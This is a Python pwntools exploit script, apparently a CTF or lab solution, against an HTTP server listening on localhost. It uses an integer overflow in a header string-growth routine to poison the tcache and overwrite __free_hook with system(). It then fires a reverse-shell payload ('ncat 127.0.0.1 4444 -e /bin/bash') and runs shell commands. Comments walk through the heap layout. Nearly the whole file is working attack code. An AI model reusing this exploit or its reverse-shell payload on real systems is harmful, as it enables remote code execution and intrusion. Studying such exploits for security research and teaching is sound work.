#!/usr/bin/env python3
from pwn import *

# Magic values for the version of LibC. Can be done via a 'leak' as well!
libc_base = 0x7ffff7dc3000
__free_hook_offset = 0x1eee48
system_offset = 0x522c0
free_hook = libc_base + __free_hook_offset
system = libc_base + system_offset

p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

p.sendline(b"GET /echo HTTP/1.1")

p.sendline(b"Content-Length: 80")
p.sendline(b"Content-Type:form")
p.sendline(b"D" * 0x40 + b":" + b"E" * 0x30) # Fill up the 0x40 bin and 0x50 to attack later! :)
p.sendline(b"F" * 0x40 + b":" + b"G" * 0x30) # Fill up the 0x40 bin and 0x50 to attack later! :)

fake_chunk = b"X-Request-Id:" + b"A" * (0x3D - 0x8) # Filler of the overflow
fake_chunk += p64(free_hook)  # Data to be written from the overflow
fake_chunk += b"B" * (0x82 - len(fake_chunk)) # Must keep the write to a VERY specific size
p.sendline(fake_chunk)

'''
The value in 'X-Request-Id' gets reflected in the output. 

In utils.c 'add_string', it will attempt to scale up the string in use. 
If this string is too small, it will call 'memcpy' on the old data to 
copy it into the new buffer. The AMOUNT of bytes in the write below
and the data before this determine the allocation from 'malloc'. In this case, 
we want to take a very specific chunk, since it will be able to 
corrupt a chunk in the 0x40 tcache bin. 

The problem is that this calculation can OVERFLOW in the math.
This results in a very small buffer being created for the write.
If we set this up properly, our ORIGINAL buffer (above) can be used 
to the overflow some chunks. 

With the heap feng shui done above, we corrupt the 'fd' pointer 
of a chunk in the 0x40 tcache bin. 
'''
p.sendline(b"X-Request-Id:" + b"C" * (int(2 ** 16) - 225))

p.sendline(b"Connection: AAA") # Specify the REUSE of the connection
p.sendline(b"hacker:AAAA")
p.sendline(b"")

#p.sendline(b"B" * 0x50) # TODO: Fix this -- Why does Content-Length not get parsed?




## Second request!
'''
At this point, there is a chunk in the 0x40 bin that points to '__free_hook' (the second chunk).
'''
p.recvline()

p.sendline(b"GET /echo HTTP/1.1") # Beginning of the HTTP request headers

# The fake chunk :)
'''
The construction of this is very particular: 
<<payload_for_sytem>>:<<address_for_system>>

At this point, the SECOND chunk in the 0x40 bin points to '__free_hook'. 
Since we want to use this chunk, we force two allocations of this size by 
creating a 'key' and 'value' of a header of size 0x30.

Once the two allocations are done, the 'value' (second chunk) will write to 
'__free_hook'. We overwrite the address here with the address of system. 

Further down in this code, the code frees the ORIGINAL chunk for the whole line.
Since 'free()' takes a single parameter (the pointer) and 'system()' takes a single 
parameter (string to execute), the beginning of the our string will be the payload for 'system'. Hence, we place this as '/bin/sh\x00'. 
'''
corrupted_data = b"ncat 127.0.0.1 4444 -e /bin/bash\x00" 
corrupted_data += b"G" * (0x30 - len(corrupted_data)) # The PAYLOAD for 'system'
corrupted_data += b":"
corrupted_data += p64(system) # Address of system
corrupted_data += b"H" * (0x30 - 8)

p.sendline(corrupted_data) 
p.sendline(b"ls; whoami;")
#p.sendline(b"hacker:AAAA")
#p.sendline(b"")

p.interactive()
